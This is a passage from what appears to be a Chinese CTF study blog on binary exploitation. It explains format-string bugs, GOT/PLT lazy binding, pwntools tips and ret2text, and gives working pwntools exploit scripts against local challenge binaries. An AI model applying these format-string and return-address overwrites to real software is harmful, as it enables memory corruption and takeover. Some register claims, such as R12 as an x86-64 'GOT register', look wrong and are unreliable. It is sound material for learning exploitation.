class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，并非所有栈上的的地址都可以被解析，所以上述方法可能会（且大概率会）造成程序崩溃<del>当然这也是一种攻击手段，只不过作用是让服务器瘫痪</del></p><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>如果此时栈上存放着got表的某个表项的内容，我们可以利用%s来读取它，并进一步获取libc版本，如果栈上未存放，我们可以将需要的got表表项地址填入栈上（情况与允许的话），然后再读取内容。</p><h3 id="修改栈内存"><a href="#修改栈内存" class="headerlink" title="修改栈内存"></a>修改栈内存</h3><p>此时我们需要用到 <strong>%n</strong> 这个格式字符串，其作用是将已经打印出的字节数存放到相应的整形变量上<br>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ssss%n&quot;</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d&quot;</span>,a);<span class="comment">//输出a=4</span></span><br></pre></td></tr></table></figure><p>我们将a换成所需修改的（栈上的）变量的地址，就可以修改栈内存</p><h3 id="修改任意地址内存"><a href="#修改任意地址内存" class="headerlink" title="修改任意地址内存"></a>修改任意地址内存</h3><p>原理与修改栈内存一样，换个目标地址就行</p><hr><p><em>覆写小数字：</em><br>如果要覆写的数字较小，比如为2（小于四字节），这样即使在32位的情况下，目标地址也占用了4个字节那么%n输出的数据就不会小于4<br>解决办法：先填入所需覆写的数据大小对应的字符串（如果要覆写成2，就填’aa’），再填入目标地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;aa&#x27;</span>,<span class="string">b&#x27;%k$naa&#x27;</span>,addr]) <span class="comment">## k记得根据实际情况改变 n后面的&#x27;aa&#x27;是为了补全四个字节</span></span><br></pre></td></tr></table></figure><p>此时栈中情况如图</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-23%20223031.png" alt="a"></p><hr><p><em>覆写大数字</em><br>如果要覆写的数字比较大，一般情况下我们无法一次性填入几十甚至几百的字符，此时我们可以利用格式化字符的宽度设置来覆写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;%20c&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>,addr]) <span class="comment"># 此时会在字符&#x27;a&#x27;前面补19个空格,使得其宽度为20</span></span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>攻防世界的CGfsb</strong></p><p>用ida查看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibuzmx64bxsmtrarmdv6r562nmb6wj4qn42xpdnie7yzkocshrmfu" alt="ida"></p><p>没有栈溢出，发现存在格式化字符串漏洞，我们的目标是使得pwnme&#x3D;8，然后即可获得flag<br>思路：可以往s写入pwnme的地址，然后再利用%n往pwnme写入8</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr=<span class="number">0x0804A068</span></span><br><span class="line">payload=flat([pwnme_addr,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;%10$n&#x27;</span>]) <span class="comment">## 10$是指往第十个参数（即printf的第十一个参数，格式化字符串的地址是printf的第一个参数）填入数据，pwnme的地址加上&#x27;aaaa&#x27;刚好八个字节</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;jack&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;please:&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>补：如何看是第几个参数？<br>gdb中利用x命令来看<br>x&#x2F;20wx $esp<br>意为查看从esp开始的20个字长的内容（以16进制显示）</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-23%20232153.png" alt="a"></p><p>其中0x61616161 为我们先前利用fgets输入的aaaa,根据它和esp间隔的距离（字长数）来判断，图中esp（即为0xffffcff0）与0x61616161 相距10个字长（从左往右数，0xffffd018为0xffffcff0存储的内容，类推），所以填%10$n。</p><h3 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h3><p>payload还有一种写法，即利用pwntools的fmtstr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804A068</span>:<span class="number">8</span>&#125;)</span><br></pre></td></tr></table></figure><p>10就是和esp间隔的距离（字长数），0x0804A068为需利用%n修改的地址，8为目标数值</p><h2 id="64位格式化字符串漏洞"><a href="#64位格式化字符串漏洞" class="headerlink" title="64位格式化字符串漏洞"></a>64位格式化字符串漏洞</h2><p>例题：【2017 UIUCTF  pwn200 GoodLuck】<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a></p><p>漏洞很明显<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20120130.png" alt="1"></p><p>我们先将断点打在printf上，随便输个数据看看情况<br>先看寄存器，格式化字符串存放在rdi寄存器上<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20115014.png" alt="1"><br>然后再看栈<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20114933.png" alt="1"><br>可以看到flag放在0x7fffffffde80的地方(打的本地，自己写的flag)，栈顶存放printf的返回地址，flag对应栈上的偏移为4（往下数第四行就有），加上寄存器的5（一共有6个来放参数嘛，rdi是第一个），所以总偏移是9   <strong>注意： 这里的flag存放在栈上，所以可以这么计算</strong><br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./goodluck&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%9$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><p>例题：【三个白帽 - pwnme_k0】<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0</a></p><p>发现relro全开，got表只读<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20155925.png" alt="11"></p><p>ida查看，发现格式化字符串漏洞<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160116.png" alt="1"><br>而且有后门函数，考虑利用printf修改retaddress，跳转到后门函数<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160044.png" alt="1"><br>ret的地址通过old rbp的地址减去偏移量来得出，old rbp的地址通过printf泄露</p><p>gdb  断点下在printf函数，不难看出rbp偏移为6 ,ret的偏移为7<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160543.png" alt="q"><br><em>为什么是old rbp？ 因为rbp保存的是old rbp的地址，%p取出的是rbp的内容，即old rbp的地址</em><br>计算得old rbp与ret的偏移为0x38 （ 0x7fffffffddf0-0x7fffffffddb8）</p><p>我们发现ret上存储的地址为0x400d74，与binsh的地址0x04008AA只有后三位不同，所以我们只用%hn修改两个字节<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io=process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;%6$p&quot;</span>)<span class="comment">#打印old rbp,这边用send的话是打不通的，因为少了一个\n的话下面的io.recvline()会将rbp地址和后面的文字合并在一起，导致ret_addr多了不必要的东西</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>) </span><br><span class="line">ret_addr= <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line">success(<span class="string">&quot;ret_addr:&quot;</span>+<span class="built_in">hex</span>(ret_addr))  <span class="comment">#泄露成功就会给出old rbp地址</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.send(p64(ret_addr))</span><br><span class="line">io.send(<span class="string">b&quot;%2218d%8$hn&quot;</span>) <span class="comment">#2218是0x8aa的十进制形式</span></span><br><span class="line">io.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定机制+got表plt表</title>
      <link href="/2024/03/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6+got%E8%A1%A8plt%E8%A1%A8/"/>
      <url>/2024/03/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6+got%E8%A1%A8plt%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><em><strong>转载，原文作者：</strong></em> <strong>载酒</strong></p><p><em>附址：<a href="https://github.com/ctfer-zaijiu?tab=stars">https://github.com/ctfer-zaijiu?tab=stars</a></em></p><p><em>仅供个人学习参考</em>  </p><span id="more"></span><h1 id="延迟绑定机制-got表plt表"><a href="#延迟绑定机制-got表plt表" class="headerlink" title="延迟绑定机制+got表plt表"></a>延迟绑定机制+got表plt表</h1><blockquote><p>也不必说，鸣蝉在树叶里长吟，肥胖的黄蜂伏在菜花上 🌾</p></blockquote><h1 id="plt表和-got-plt表"><a href="#plt表和-got-plt表" class="headerlink" title=".plt表和.got.plt表"></a>.plt表和.got.plt表</h1><p><strong>【定义】</strong> </p><p>got表思想就是设计一个got表用来存放所有全局符号地址，早在静态链接的设计中就有，其中实现上被实现为了以下两个表：</p><p>1、<code>.got</code>存放全局变量引用地址</p><p>2、<code>.got.plt</code>存放函数引用地址</p><p>为了实现延迟绑定机制，才在got表的基础上接入了plt表，其加入有2 个设计目标：</p><p>1、实现第一次调用函数时会做重定位，而后第二次之后的所有函数调用就都是直接调用</p><p>2、实现传参并调用_dl_runtime_resolve()</p><p>这两个表被ld.so也就是动态链接器所维护，主要是：在ld.so里定义了一个_dl_runtime_resolve函数用来进行重定位+符号地址解析，并将结果更新在plt、got表中。</p><p><strong>【结构】</strong></p><p>plt表存储指令，got表存储指令要用到的 数据。他们都是：可复用的东西放表头，某函数独有的东西做表项。</p><ul><li><p><strong>plt表的结构如下：</strong></p><ul><li><p>表头是调用runtime_resorve函数的指令，每个函数在第一次用runtime_resorve函数进行“符号地址解析”时就对该段指令进行复用。</p></li><li><p>每个表项是以下三条指令：</p><p>  1、jmp,用来跳到函数处，使用的地址存在got表表项。如果成功就直接调到函数，如果失败（符号地址未被解析）就跳到接下来的指令“2”“3”</p><p>  2、push,用来给runtime_resorve函数传参，数据用立即数</p><p>  3、jmp,跳回plt表头</p></li></ul></li><li><p><strong>got表的结构如下：</strong></p><ul><li>表头是三个特殊地址，是每个函数进行重定位时可以复用的调用runtime_resolve函数的数据，其中：<ul><li>got[0]是.dymanic段的基址</li><li>got[1]是一个指向linkmap结构体实现的指针，该结构体实现位于栈上</li><li>got[2]是_dl_runtime_resolve函数的地址</li></ul></li><li>每个表项都是一个地址指针，被重定位前指向plt表的对应字段的第二句指令开始处，被重定位后指向对应函数地址处</li></ul></li></ul><p><strong>总体结构如下图↓：</strong></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreihsuwn4yezxio5buc27wd6ncxz7atafjz44lrxgjw233qhqafi7vi" alt="Untitled"></p><p><strong>【位置】</strong></p><p>这两个表是每个程序私有的，而不是可以多个程序之间共享的。</p><p>也就是说，在不开ASLR的情况下，每一次运行elf程序时got表、plt表的基址的后12位是一样的！</p><p>“got”表基址通常存放在特定的寄存器中，以便在程序执行时快速访问。具体来说，常见的做法是将”got”表基址存放在全局偏移表寄存器（Global Offset Table Register，通常简称为GOT寄存器）中。</p><p>GOT寄存器的命名和具体寄存器编号会根据不同的体系结构和操作系统而有所不同。以下是一些常见架构和操作系统中使用的GOT寄存器示例：</p><p>x86架构（32位）：</p><ul><li>在x86架构的Linux系统中，GOT寄存器通常是EBX（32位寄存器）。</li></ul><p>x86架构（64位）：</p><ul><li>在x86架构的Linux系统中，GOT寄存器通常是R12（64位寄存器）。</li></ul><p>ARM架构：</p><ul><li>在ARM架构中，GOT寄存器通常是R9（ARMv7架构）或X19（ARMv8架构）。</li></ul><p>MIPS架构：</p><ul><li>在MIPS架构中，GOT寄存器通常是GP（全局指针寄存器）。<br>需要注意的是，具体的寄存器使用可能会受到编译器、操作系统和编译选项的影响。因此，对于特定的平台和环境，可能会有一些变化。</li></ul><p><strong>【相关操作】</strong></p><p>可以通过pwntools的以下指令来获得这两个表中某个函数的地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./pwntest&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以通过objdump来查看一个elf的got表plt表中共有哪些函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看文件的got表</span></span><br><span class="line">$ objdump -R pwn3</span><br><span class="line"><span class="comment">#查看文件的plt表</span></span><br><span class="line">$ objdump -dj .plt migration </span><br></pre></td></tr></table></figure><h1 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h1><p><strong>【定义】</strong></p><p>又叫lazybinding，其通过got表和plt表的联动，实现：</p><p>第一次访问plt表时会执行run_time_resolve，第二次及以后访问plt表时就会自动跳转到函数代码，如图↓：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiajnqsybm34don75dcab7qqc3dlpvbzota5et6yjwyci62yagx7lu" alt="Untitled"></p><p>当函数第一次用到时才进行重定位获取位置，这样会大大提高程序启动速度</p><p><strong>【实现过程】</strong></p><p>第一次执行该对该func的call时的指令执行流程：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreigprlkufrc5h7mnh4vtgmaxfi4dfvc54xu4vkubnbplzlf5sry4ni" alt="执行完dl_runtime_resolve函数完成重定位后会返回call语句的前一句语句位置，然后再执行第2次对该func的call"></p><p>执行完dl_runtime_resolve函数完成重定位后会返回call语句的前一句语句位置，然后再执行第2次对该func的call</p><p>重定位完成后，第2、3、4…次执行对该func的call时的指令执行流程：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreicmjb5ifjomdh4pmcdvlrjwo5hm7d3uowx3ab3c7vurh4dhscxyx4" alt="Untitled"></p><h1 id="不使用延迟绑定"><a href="#不使用延迟绑定" class="headerlink" title="不使用延迟绑定"></a>不使用延迟绑定</h1><p>1、在一些情况下，一个 GCC 编译的程序可能不会有 PLT 表。这通常是因为编译器或链接器在某些情况下会进行优化，例如，如果程序中没有对动态链接库函数的显式调用或者只有很少的动态链接库函数，那么编译器或链接器可能会选择不生成 PLT 表。</p><p>2、在linux系统中使用使用FullRelro安全策略时，默认直接装载时全部重定位，此时也不会有plt表而只会有got表</p><p>3、弱符号引用：当程序使用弱符号引用时，通常也不会使用延迟绑定。弱符号是一种特殊类型的符号引用，（举个栗子：在c&#x2F;c++语言中，编译器默认函数和已经初始化的全局变量为强符号，未初始化的全局变量为弱符号）其绑定是可选的（即弱引用），如果找不到符号的定义，程序可以继续执行（默认值为0或别的特殊值）。在这种情况下，通常会在程序启动时立即解析和绑定弱符号引用，以便在需要时进行正确的调用或访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tips</title>
      <link href="/2024/03/20/Tips/"/>
      <url>/2024/03/20/Tips/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>有时候flag文件没有放在当前目录下<br>用以下指令查找flag位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name flag</span><br></pre></td></tr></table></figure><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><p>strcmp的特性是遇到’\x00’就停止比较字符串，可以考虑0截断绕过</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="number">0xa</span> //直接输入十六进制数，然后回车</span><br></pre></td></tr></table></figure><h3 id="十六进制转字符"><a href="#十六进制转字符" class="headerlink" title="十六进制转字符"></a>十六进制转字符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="built_in">chr</span>(<span class="number">0x41</span>) //输出为<span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="打印某函数的got表地址"><a href="#打印某函数的got表地址" class="headerlink" title="打印某函数的got表地址"></a>打印某函数的got表地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line">elf.got[<span class="string">&#x27;function&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="打包成字符串并发送"><a href="#打包成字符串并发送" class="headerlink" title="打包成字符串并发送"></a>打包成字符串并发送</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure><hr><p>p32&#x2F;p64: 打包一个整数，分别打包为32位或64位<br>u32&#x2F;u64:解包一个字符串，得到整数</p><h3 id="关于p64（p32）"><a href="#关于p64（p32）" class="headerlink" title="关于p64（p32）"></a>关于p64（p32）</h3><p>%s就得用p32&#x2F;p64 传输数据<br>p打包函数是将整数打包为相对应位数的地址表示方式<br>u解包函数就是把\x\x码重新变为整数</p><p>&emsp;&emsp;在使用 p64 函数或者其他打包函数时，确保该函数是一个<strong>整数</strong>，而不是字节串或者其他非整数类型的数据。<br>&emsp;&emsp;如果该函数是以字节串形式表示的十六进制地址（如 b’0x7ffc52917000’），需要先将其转换为整数再进行处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 buf 是一个字节串表示的十六进制地址</span></span><br><span class="line">buf_bytes = <span class="string">b&#x27;0x7ffc52917000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节串表示的十六进制地址转换为整数</span></span><br><span class="line">buf_int = <span class="built_in">int</span>(buf_bytes, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用p64打包函数</span></span><br><span class="line">p64(buf_int)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="发送和接受数据"><a href="#发送和接受数据" class="headerlink" title="发送和接受数据"></a>发送和接受数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">conn.send(data) <span class="comment">#发送数据</span></span><br><span class="line">conn.sendline(data) <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line"><span class="comment">#接收数据，numb制定接收的字节，timeout指定超时</span></span><br><span class="line">conn.recv(numb = <span class="number">2048</span>, timeout = default)</span><br><span class="line"><span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">conn.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">conn.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle) <span class="comment">##drop=true 时接受的数据会去除引号内的内容，返回的数据为字符串类型</span></span><br><span class="line"><span class="comment">##若要做计算，需转为如int 类型</span></span><br><span class="line"><span class="built_in">int</span>(conn.recv(),<span class="number">16</span>) <span class="comment">## 16意为16进制</span></span><br><span class="line">conn.recvall()  <span class="comment">#一直接收直到 EOF</span></span><br><span class="line">conn.recvrepeat(timeout = default)  <span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line"><span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="comment">## 在Python 3中，print是一个函数，而不再是一个语句，所以正确的语法是使用括号将要打印的内容括起来</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.address))  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># 函数地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.plt[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>*选中伪代码，右键可将其复制到汇编代码中</p><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>b main的时候gdb查找不到函数的，是因为main函数被删符号表，体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数</p><h2 id="syscall和函数传参"><a href="#syscall和函数传参" class="headerlink" title="syscall和函数传参"></a>syscall和函数传参</h2><p>*x86<br>    返回值：eax<br>    syscall：int 0x80<br>    syscall调用号：eax<br>    syscall参数：ebx ecx edx esi edi ebp<br>    函数参数：stack<br>*x86_64<br>    返回值：rax<br>    syscall：syscall<br>    syscall调用号：rax<br>    syscall参数：rdi rsi rdx r10 r8 r9<br>    函数参数：rdi rsi rdx rcx r8 r9 stack<br>*arm32(aarch32)<br>    返回值 : r7<br>    syscall : svc 0<br>    syscall调用号: r7<br>    syscall参数: r0 , r1 , r2 , r3 , stack<br>    函数参数: r0 , r1 , r2 , r3 , stack<br>*arm64(aarch64)<br>    返回值 : x0<br>    syscall : svc 0<br>    syscall调用号: x8<br>    syscall参数: x0 , x1 , x2 , x3 , x4 , x5<br>    函数参数: x0 , x1 , x2 , x3 , x4 , x5 , x6 , x7 , stack</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本ROP</title>
      <link href="/2024/03/19/%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2024/03/19/%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><em>有后门就是爽</em></p><p>&emsp;&emsp;先checksec一下<br><img src="https://gateway.pinata.cloud/ipfs/bafkreidinxxhoal5le2ostrvnsk2e642q6igikurfyqknvipghipusys3e" alt="checksec"><br>开启了nx保护和部分relro<br>用ida查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreidgjsu6uimvkdto3w7llwdyq55cvztg7hds5nbkwtzpq6qakvrth4" alt="ida"><br>明显有个栈溢出，且存在后门函数<br>&emsp;&emsp;基本思路：我们只需往变量s里填充垃圾数据，覆盖到ebp，再加入后门函数的地址，就可以获得shell。<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">backdoor=<span class="number">0x0804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>)+p32(backdoor)</span><br><span class="line">io=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，多填充4字节的垃圾数据是为了覆盖ebp of previous stack frame，即父函数的栈帧的基指针（通常使用ebp寄存器来保存）</p><hr><p><em>补充：当一个函数被调用时，它会在栈上创建一个新的栈帧，用于存储函数的局部变量、参数和其他上下文信息。在创建新栈帧时，当前函数会将其<u>前一个栈帧的基指针值</u>保存在 ebp 寄存器中，以便后续操作可以访问前一个栈帧。</em><br><img 